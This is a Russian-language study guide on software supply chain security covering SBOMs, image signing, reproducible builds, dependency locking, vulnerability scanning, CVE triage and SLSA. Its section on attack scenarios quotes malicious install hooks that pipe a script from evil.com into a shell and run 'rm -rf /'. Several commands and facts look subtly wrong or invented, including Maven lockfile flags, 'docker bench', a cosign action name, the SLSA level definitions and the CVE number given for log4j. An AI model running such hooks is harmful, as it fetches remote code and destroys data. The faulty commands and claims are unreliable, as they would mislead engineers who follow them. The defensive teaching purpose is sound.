# Supply Chain Security

### 1. SBOM (Software Bill of Materials — «состав» программного обеспечения): CycloneDX, SPDX

**SBOM** — структурированный список всех компонентов в программном артефакте (зависимости, версии, хеши, лицензии). Аналог «состава ингредиентов» на упаковке — показывает, из чего состоит приложение.

**Зачем:**
- **Vulnerability management** (управление уязвимостями): SBOM → сканирование → алерты по CVE (уязвимости в зависимостях).
- **License compliance** (соответствие лицензиям): SBOM → проверка, что все лицензии совместимы (например, GPL не попал в проприетарный продукт).
- **Security audit** (аудит безопасности): SBOM → проверка provenance (происхождения — кто и когда собрал артефакт).
- **Regulatory** (регуляторные требования): EU Cyber Resilience Act (2026) — SBOM обязателен для hardware/software, продаваемого в ЕС.

**Форматы:**

- **CycloneDX** (основной формат для безопасности):
  ```xml
  <plugin>
      <groupId>org.cyclonedx</groupId>
      <artifactId>cyclonedx-maven-plugin</artifactId>
      <version>2.8.0</version>
      <executions>
          <execution>
              <goals><goal>makeBom</goal></goals>
          </execution>
      </executions>
  </plugin>
  ```
  - JSON или XML.
  - **Component hierarchy** (иерархия компонентов): direct (прямые зависимости, которые вы объявили) + transitive (транзитивные — зависимости зависимостей).
  - **Hashes** (хеши, обычно SHA-256), лицензии, ссылки на CVE.

- **SPDX** (Software Package Data Exchange — формат, сфокусированный на лицензиях):
  - Лицензионный focus: licenses, copyright.
  - Форматы: tag-value, RDF, JSON.
  - Когда: license compliance, legal review (юридический аудит).

**Tools (инструменты):**
- `syft` (Aqua) — генерация SBOM из container image или source code.
- `grype` (Anchore) — сканирование SBOM на CVE.
- `trivy` (Aqua) — SBOM + сканирование уязвимостей (контейнеры, файловая система, код).
- `OWASP Dependency-Check` — Maven/Gradle плагин, использует базу NVD (National Vulnerability Database — государственная база уязвимостей США).

**CI integration (интеграция в CI):**
```yaml
# GitHub Actions
- name: Generate SBOM
  run: mvn cyclonedx:makeBom
- name: Upload SBOM
  uses: actions/upload-artifact@v4
  with:
    name: sbom
    path: bom.json
```

### 2. Sigstore/cosign: подпись container images

**Проблема:** как гарантировать, что image в registry — тот, что вы собрали, а не подменён злоумышленником (supply chain attack — атака на цепочку поставок)?

**Sigstore** (open source framework от CNCF):
- **Components** (компоненты):
  - `cosign` — CLI-инструмент для подписи и верификации.
  - `fulcio` — CA (Certificate Authority — центр сертификации), выдаёт short-lived certificates (короткоживущие сертификаты, живут минуты/часы, а не годы).
  - `rekor` — transparency log (журнал прозрачности — публичный неизменяемый лог всех подписей, любой может проверить, что подпись не подделана).
- **Keyless signing** (подпись без ключей — через OIDC): вместо долгоживущего приватного ключа используется OIDC-токен от CI-системы (GitHub Actions, GCP, AWS). Ключ не нужно хранить → меньше поверхность для атаки.

**Cosign (CLI):**
```bash
# Sign image (keyless, GitHub Actions)
cosign sign --yes ghcr.io/owner/repo:tag

# Verify signature (проверить подпись)
cosign verify --yes ghcr.io/owner/repo:tag

# Verify against specific identity (проверить, что подписала конкретная CI-система)
cosign verify --yes \
  --issuer=https://token.actions.githubusercontent.com \
  --identity-regexp=".*github.com/owner/repo.*" \
  ghcr.io/owner/repo:tag
```

**GitHub Actions integration:**
```yaml
- name: Sign image
  uses: sigstore/cosign-action@v3
  with:
    image: ${{ env.IMAGE }}
    tags: ${{ env.TAG }}
    upload: true
```

**Kubernetes admission (проверка при деплое в кластер):**
- `sigstore/policy-controller` — проверяет подписи перед развёртыванием.
- **ValidatingWebhook** (валидирующий вебхук — механизм Kubernetes, перехватывающий запросы на создание ресурсов): reject (отклонить) images без валидной подписи.

**Практика 2026:**
- Подписывать все production images.
- Verify (проверка) в CI: build → sign → push.
- Verify в кластере: admission controller (контроллер доступа) отклоняет неподписанные.
- Keyless signing (OIDC) — предпочтительнее долгоживущих ключей.

### 3. Reproducible builds (воспроизводимые сборки — одинаковый исходный код даёт одинаковый бинарник): проверка идентичности

**Цель:** один и тот же source code → один и тот же binary (бинарник), идентичный до бита (hash match — хеши совпадают).

**Почему важно:**
- **Supply chain attack detection** (обнаружение атак на цепочку поставок): если исходный код был модифицирован → бинарник будет другим → хеш не совпадёт.
- **Audit** (аудит): третья сторона может воспроизвести сборку из исходников и проверить, что бинарник в registry — тот, что собран из этих исходников.
- **Transparency** (прозрачность): нет скрытых модификаций.

**Tools (инструменты):**
- `reproducible-builds.org` — стандарт и набор инструментов.
- **Java**: Maven/Gradle — не reproducible из коробки (timestamps — метки времени в манифесте, random ordering — случайный порядок ресурсов в JAR).
  - **Workaround** (обход): fix timestamps (фиксировать через `SOURCE_DATE_EPOCH` — Unix timestamp, который все инструменты используют вместо текущего времени), sort resources (сортировать ресурсы).
  - `mvn package -Dbuild.timestamp=...`
- **Docker**: `docker build` с `--build-arg SOURCE_DATE_EPOCH=...`.
- `debsnap`, `reprotest` — для Linux packages (deb-пакеты).

**CI/CD (проверка в CI):**
```yaml
# Build twice, compare hashes (собрать дважды, сравнить хеши)
- name: Build 1
  run: mvn package && sha256sum target/app.jar > hash1
- name: Build 2
  run: mvn package && sha256sum target/app.jar > hash2
- name: Compare
  run: diff hash1 hash2 || echo "Not reproducible!"
```

**Практика:**
- Не критично для Java (JVM, не нативный binary — хеш JAR может отличаться из-за timestamps, но код идентичен).
- Критично для native (нативных бинарников): GraalVM (native image), C, Go, Rust.
- Docker images: layer hashes (хеши слоёв) должны match (совпадать) при воспроизводимой сборке.

### 4. Dependency verification (верификация зависимостей — проверка, что скачаны именно те версии): Gradle verification metadata, Maven locked modes

**Gradle Verification Metadata (`gradle/verification-metadata.xml`):**
```xml
<verification-metadata xmlns="http://schemas.gradle.org/gradle-verification-metadata/1.0">
    <components>
        <component group="com.example" name="lib" version="1.0.0">
            <artifact>
                <sha256 value="abc123..." origin="Generated by Gradle"/>
            </artifact>
        </component>
    </components>
</verification-metadata>
```
- `gradle --write-verification-metadata sha256` — сгенерировать файл верификации (Gradle скачает все зависимости и запишет их SHA-256 хеши).
- Build: Gradle проверяет хеши при скачивании, fail (падение сборки) on mismatch (несовпадении).
- Когда: locked dependencies (зафиксированные зависимости), security audit.

**Maven locked modes:**
- `mvn dependency:resolve -Dlockfile` — сгенерировать lock file (файл блокировки — фиксирует версии и хеши).
- `mvn -Dlockfile` — верификация по lock file (сборка падает, если версия изменилась).
- Maven 3.9+: `maven-lockfile` plugin.
- **Alternative** (альтернатива): `maven-enforcer-plugin` — запретить/требовать конкретные версии (ban versions, require versions).

**Практика:**
- **Production** (производство): locked dependencies (зафиксированные зависимости — нет surprise updates — неожиданных обновлений).
- **CI**: verify hashes (проверка хешей), fail on mismatch.
- **Update process** (процесс обновления): explicit dependency bump (явное повышение версии) → regenerate lock file (пересоздать файл блокировки) → CI проверяет.

### 5. Vulnerability scanning (сканирование уязвимостей): Snyk, Dependabot, OWASP Dependency-Check

**Tools (инструменты):**
- **Snyk** (commercial — коммерческий): SCA (Software Composition Analysis — анализ состава ПО) + container scan + IaC (Infrastructure as Code — код инфраструктуры), облачная платформа.
- **Dependabot** (GitHub): auto-update PRs (автоматические PR с обновлением зависимостей), vulnerability alerts (алерты об уязвимостях).
- **OWASP Dependency-Check** (OSS — open source): Maven/Gradle плагин, использует NVD (National Vulnerability Database — государственная база уязвимостей).
- **Trivy** (Aqua): container scan + filesystem + SCA.
- **Grype** (Anchore): SCA, SBOM-based (работает на SBOM).

**OWASP Dependency-Check (Maven):**
```xml
<plugin>
    <groupId>org.owasp</groupId>
    <artifactId>dependency-check-maven</artifactId>
    <version>9.0.0</version>
    <configuration>
        <failBuildOnCVSS>7</failBuildOnCVSS>
        <suppressionFile>suppressions.xml</suppressionFile>
    </configuration>
</plugin>
```
- `failBuildOnCVSS` — падение сборки, если найдена уязвимость с CVSS выше порога.
- `suppressionFile` — файл исключений (ложные срабатывания).

**Dependabot (GitHub):**
```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "maven"
    directory: "/"
    schedule:
      interval: "weekly"
    groups:
      spring:
        patterns: ["org.springframework*"]
```
- Еженедельная проверка уязвимостей и автоматические PR.

**CI/CD:**
```yaml
# GitHub Actions
- name: Snyk scan
  uses: snyk/actions/maven@master
  env:
    SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
  with:
    args: --fail-on=all

- name: Trivy scan
  uses: aquasecurity/trivy-action@master
  with:
    scan-type: 'fs'
    format: 'sarif'
    output: 'trivy-results.sarif'
```

**Процесс:**
1. **Scan** (сканирование): в CI, на каждый PR и каждую сборку.
2. **Report** (отчёт): dashboard (Snyk, GitHub Security).
3. **Triage** (триаж — приоритизация): CVSS score, exploitability (эксплойтабельность — насколько легкоexploit), business impact (влияние на бизнес).
4. **Patch** (патч): Dependabot PR или manual update (ручное обновление).
5. **Verify** (верификация): re-scan (повторное сканирование), confirm fix (подтверждение исправления).

### 6. CVE management (управление CVE — уязвимостями): приоритизация, стратегия патчинга

**CVE (Common Vulnerabilities and Exposures — общие уязвимости и угрозы):** уникальный идентификатор для уязвимости (например, CVE-2024-1234).

**Prioritization (приоритизация):**
- **CVSS score** (Common Vulnerability Scoring System — общая система оценки уязвимостей, 0-10): exploitability (эксплойтабельность) + impact (влияние).
  - **Critical** (критическая): 9.0-10.0
  - **High** (высокая): 7.0-8.9
  - **Medium** (средняя): 4.0-6.9
  - **Low** (низкая): 0.1-3.9
- **EPSS** (Exploit Prediction Scoring System — система прогноза эксплойта): вероятность публичного exploit в 30 дней (0-1).
- **Business context** (бизнес-контекст): используется ли эта зависимость в critical path (критическом пути — основной бизнес-процесс)?

**Patching strategy (стратегия патчинга):**
1. **Critical (CVSS 9+, EPSS > 0.5)**: patch within 24-48h (патч в течение 24-48 часов).
2. **High (CVSS 7-8.9)**: patch within 1 week (в течение 1 недели).
3. **Medium (CVSS 4-6.9)**: patch within 1 month (в течение 1 месяца).
4. **Low (CVSS 0.1-3.9)**: patch quarterly (квартально).

**Process (процесс):**
- **Alert** (алерт): Snyk, Dependabot, GitHub Security.
- **Triage** (триаж): security team (команда безопасности) — is it real? (реальная ли уязвимость?) impact? (какое влияние?)
- **Assess** (оценка): which services affected? (какие сервисы затронуты?) critical path?
- **Patch** (патч): update dependency (обновить зависимость), test (тестирование), deploy (деплой).
- **Verify** (верификация): re-scan, monitor (мониторинг).
- **Document** (документирование): post-mortem (разбор инцидента), lessons learned (выводы).

**Suppressions (исключения):**
- **False positive** (ложное срабатывание): CVE не applicable (не применима) к нашему использованию.
- **Accepted risk** (принятый риск): patch не available (патч недоступен), risk acceptable (риск приемлем).
- Инструменты: `suppressions.xml` (OWASP), Snyk ignore, Dependabot ignore.

### 7. Build provenance (происхождение сборки) и SLSA framework

**SLSA (Supply-chain Levels for Software Artifacts — уровни безопасности цепочки поставок ПО):**
- Framework (фреймворк) для evaluation (оценки) supply chain security.
- **Levels** (уровни): L1 (базовый) → L4 (наивысший).
- **Focus** (фокус): provenance (происхождение), build integrity (целостность сборки), identity (идентичность).

**SLSA Levels:**
- **L1**: Build provenance — кто, что, когда, где собрал (who, what, when, where).
- **L2**: L1 + build isolation (изоляция сборки — hermetic build: сборка в изолированной среде, no external access — нет доступа извне).
- **L3**: L2 + reproducible builds (воспроизводимые сборки) + verified provenance (проверенное происхождение).
- **L4**: L3 + formal verification (формальная верификация — математическое доказательство корректности).

**Provenance (происхождение):**
- `in-toto` / `SLSA Provenance` — signed attestation (подписанное утверждение — документ, подписанный криптографически, который утверждает факты о сборке):
  ```json
  {
    "_type": "https://slsa.dev/provenance/v0.2",
    "buildType": "https://github.com/actions/runner",
    "builder": { "id": "https://github.com/owner/repo" },
    "buildInvocation": { "configSource": { "revision": "abc123" } },
    "materials": [ { "uri": "sha256:...", "digest": "..." } ],
    "product": [ { "uri": "sha256:...", "digest": "..." } ]
  }
  ```
  - `builder` — кто собрал (CI-система).
  - `materials` — исходные материалы (код, зависимости) с хешами.
  - `product` — результат сборки с хешем.
- **Signed** (подписанный): Sigstore, in-toto.
- **Verified** (проверенный): consumer (потребитель) проверяет подпись и builder identity (идентичность сборщика).

**Tools:**
- `in-toto` — framework for provenance (фреймворк для происхождения).
- `slsa-github-generator` — генерация provenance в GitHub Actions.
- `cosign` — верификация provenance.

**GitHub Actions (SLSA L3+):**
```yaml
# .github/workflows/build.yml
- name: Build with provenance
  uses: slsa-framework/slsa-github-generator@v1
  with:
    compile_cmd: "mvn package"
```

**Практика 2026:**
- SLSA L2+ для production builds (сборки в производство).
- Provenance для всех container images.
- Verify provenance в кластере (admission — проверка при деплое).
- GitHub Actions: built-in SLSA support (встроенная поддержка SLSA).

### 8. Dependency analysis: как найти транзитивные зависимости и их уязвимости
**Проблема:** прямые зависимости безопасны, но транзитивные — с CVE.

**Инструменты:**
```bash
# Maven: dependency tree
mvn dependency:tree

# Gradle: dependencies
./gradlew dependencies

# OWASP Dependency-Check (сканер):
mvn org.owasp:dependency-check-maven:check
```

**Вывод:** транзитивные зависимости часто содержат CVE. Сканируй ВСЕ зависимости (не только прямые).

### 9. Container image scanning: Trivy, Docker Bench, Grype
**Container image scanning** = проверка образа на уязвимости (CVE в OS packages, app dependencies).

```bash
# Trivy:
trivy image myapp:1.0

# Grype (Anchore):
grype myapp:1.0

# Docker Bench (безопасность Docker daemon):
docker bench
```

**Что сканируется:**
- OS packages (apt, yum, apk)
- App dependencies (npm, pip, maven, gradle)
- Misconfiguration (wrong ports, sensitive dirs)
- Secrets (API keys, passwords in image layers)

**CI/CD:**
```yaml
# GitHub Actions:
- name: Scan container image
  run: trivy image --severity HIGH,CRITICAL --exit-code 1 myapp:1.0
```

### 10. Secret scanning в CI/CD: TruffleHog, gitleaks, GitHub Secret Scanning
**Проблема:** secrets (API keys, passwords) коммитятся в репозиторий.

```bash
# TruffleHog:
trufflehog git file://. --since-commit HEAD~10

# gitleaks:
gitleaks detect --source .

# GitHub Secret Scanning (встроен):
# Автоматически сканирует на push
```

**Правила:**
- **Никогда** не коммитить secrets
- **Использовать** secrets manager (AWS Secrets Manager, Vault)
- **Ротация** secrets (еженедельно)
- **Scanning** на push (CI)

### 11. Code signing: Sigstore, cosign, notary
**Code signing** = подпись артефактов (container images, JAR, binaries) для проверки подлинности.

```bash
# Sigstore (keyless signing):
cosign sign --keyless myapp:1.0

# Verify:
cosign verify --keyless myapp:1.0

# Notary (Docker):
notary sign myapp:1.0
```

**Ключевые фичи:**
- **Keyless signing** (Sigstore) — не нужно управлять ключами
- **Reproducible builds** — один исходный код = один артефакт
- **Verification** — проверка подписи перед deploy

### 12. Software composition analysis (SCA): Snyk, OWASP Dependency-Check, Dependabot
**SCA** (Software Composition Analysis) = анализ состава ПО (зависимости, лицензии, уязвимости).

```bash
# Snyk:
snyk test
snyk monitor

# OWASP Dependency-Check:
mvn org.owasp:dependency-check-maven:check

# Dependabot (GitHub, автоматический):
# .github/dependabot.yml
```

**Что проверяется:**
- CVE в зависимостях
- Лицензии (GPL, MIT, Apache)
- Транзитивные зависимости
- Платформенные зависимости (OS packages)

### 13. License compliance: проверка лицензий зависимостей
**Проблема:** GPL-зависимость в коммерческом продукте = нарушение лицензии.

```bash
# License check:
mvn license:check
npm license

# License report:
mvn license:report
```

**Правила:**
- **MIT, Apache 2.0** — можно использовать
- **GPL** — нельзя использовать в коммерческом продукте (или весь продукт под GPL)
- **LGPL** — можно использовать (с ограничениями)
- **Custom** — проверить условия

### 14. Reproducible builds: как гарантировать, что артефакт собран из исходного кода
**Проблема:** артефакт (JAR, image) не воспроизводим (timestamp, file order).

**Maven:**
```bash
# Reproducible build:
mvn clean package -Dproject.build.outputTimestamp=2024-01-01T00:00:00Z
```

**Gradle:**
```groovy
tasks.withType(AbstractArchiveTask) {
    preserveFileOrder = true
}
```

**Docker:**
```dockerfile
# Reproducible image:
FROM base:1.0
COPY . /app
RUN --mount=type=bind,source=.,target=/src /build.sh
```

**Проверка:**
```bash
# Build 2 раза, сравнить hash:
sha256sum myapp-1.0.jar
# Должны совпадать
```

### 15. Supply chain attack scenarios: typosquatting, dependency confusion, malicious packages
**Typosquatting:**
```
# Злоумышленник регистрирует:
# lodash (легитимный)
# lodashs (typo, malicious)

# Разработчик ошибается:
npm install lodashs  # malicious package
```

**Dependency confusion:**
```
# Злоумышленник публикует на npm:
# @company/private-package (private, должен быть в private registry)

# Разработчик:
npm install @company/private-package
# npm находит public package (malicious)
```

**Malicious packages:**
```
# Package содержит:
# postinstall: curl evil.com | sh
# preinstall: rm -rf /
```

**Защита:**
- **Private registry** (npm, maven)
- **Dependency verification** (Gradle verification metadata)
- **SCA** (сканирование)
- **Code review** (проверка зависимостей)

### 16. Secure build pipeline: как настроить CI/CD для безопасных сборок
**Pipeline:**
```yaml
# GitHub Actions:
name: Secure Build
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      # 1. SCA
      - name: SCA scan
        run: snyk test --severity-threshold high
      
      # 2. Build
      - name: Build
        run: mvn clean package
      
      # 3. Container scan
      - name: Scan container
        run: trivy image --severity HIGH,CRITICAL myapp:1.0
      
      # 4. Sign
      - name: Sign image
        run: cosign sign --keyless myapp:1.0
      
      # 5. Deploy
      - name: Deploy
        run: kubectl set image deployment/myapp myapp=myapp:1.0
```

**Правила:**
- **SCA** на каждом push
- **Container scan** перед deploy
- **Code signing** перед deploy
- **Private registry** для артефактов

### 17. VEX (Vulnerability Exploitability eXchange): формат для управления уязвимостями
**VEX** = формат для описания уязвимостей (CVE, exploitability, mitigations).

```json
{
  "@context": "https://openvex.dev/ns/v0.2.0",
  "@id": "https://example.com/vex/vex-123.json",
  "author": "Example Inc.",
  "timestamp": "2024-01-15T10:30:00Z",
  "vulnerabilities": [
    {
      "@id": "CVE-2024-1234",
      "vulnerability": "CVE-2024-1234",
      "status": "affected",
      "impact_statement": "This vulnerability affects our product.",
      "action_statement": "Upgrade to version 2.0."
    }
  ]
}
```

**Статусы:**
- **not_affected** — уязвимость не влияет
- **affected** — уязвимость влияет
- **fixed** — уязвимость исправлена
- **under_investigation** — расследуется

### 18. Software supply chain security: NIST SP 800-161
**NIST SP 800-161** = стандарт для безопасности supply chain.

**Ключевые принципы:**
- **Provenance** — происхождение ПО (кто, когда, где собрал)
- **Integrity** — целостность (подписи, hash)
- **Vulnerability management** — управление уязвимостями
- **Incident response** — реагирование на инциденты

**Компоненты:**
- **SBOM** (Software Bill of Materials)
- **Code signing**
- **SCA** (Software Composition Analysis)
- **VEX** (Vulnerability Exploitability eXchange)
- **Reproducible builds**

### 19. Supply chain security metrics: как измерять безопасность
**Метрики:**
- **CVE per release** — количество CVE в релизе
- **Time to patch** — время до патча
- **SBOM coverage** — покрытие SBOM (сколько зависимостей описано)
- **License compliance** — соответствие лицензиям
- **Reproducible build rate** — доля воспроизводимых сборок

**Dashboard:**
```
CVE per release: 5 (target: < 3)
Time to patch: 2 days (target: < 7 days)
SBOM coverage: 95% (target: 100%)
License compliance: 100%
Reproducible build rate: 80% (target: 100%)
```

### 20. Incident response: что делать, если обнаружена уязвимость в supply chain
**Процесс:**
1. **Detect** — обнаружение (SCA, Snyk, Dependabot)
2. **Assess** — оценка (severity, exploitability, impact)
3. **Mitigate** — митигация (patch, rollback, WAF)
4. **Notify** — уведомление (stakeholders, customers)
5. **Post-mortem** — разбор (что произошло, как предотвратить)

**Пример:**
```
CVE-2024-1234 (HIGH) in log4j 2.14.1
Impact: RCE (Remote Code Execution)
Mitigation: Upgrade to log4j 2.17.1
Notification: All stakeholders
Post-mortem: Add log4j to SCA, enable Dependabot
```
